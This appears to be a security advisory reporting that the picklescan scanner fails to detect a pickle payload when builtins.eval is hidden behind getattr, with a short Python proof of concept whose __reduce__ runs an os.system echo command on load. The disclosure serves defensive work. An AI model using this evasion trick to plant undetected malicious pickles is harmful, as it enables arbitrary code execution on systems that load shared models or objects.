summary: "picklescan missing detection by simple obfuscation of a `builtins.eval` call\n###\
  \ Summary\n\nAn unsafe deserialization vulnerability allows any unauthenticated user to execute\
  \ arbitrary code on the host loading a pickle payload from an untrusted source.\n\n### Details\n\
  \nIt's possible to hide the `eval` call nested under another callable via `getattr`.\n\n###\
  \ PoC\n\n```python\nimport builtins\n\nclass EvilClass:\n    @staticmethod\n    def _obfuscated_eval(payload):\n\
  \        getattr(builtins, \"eval\")(payload)\n\n    def __reduce__(self):\n        payload\
  \ = \"__import__('os').system('echo \\\"successful attack\\\"')\"\n        return self._obfuscated_eval,\
  \ (payload,)\n```\n\n\n### Impact\n\nWho is impacted? \nAny organization or individual relying\
  \ on picklescan to detect malicious pickle files from untrusted sources.\n\nWhat is the impact?\
  \ \nAttackers can embed malicious code in pickle file that remains undetected but executes\
  \ when the pickle file is loaded.\n\nSupply Chain Attack: Attackers can distribute infected\
  \ pickle files to system that load serialized ML models, APIs, or saved Python objects from\
  \ untrusted sources."
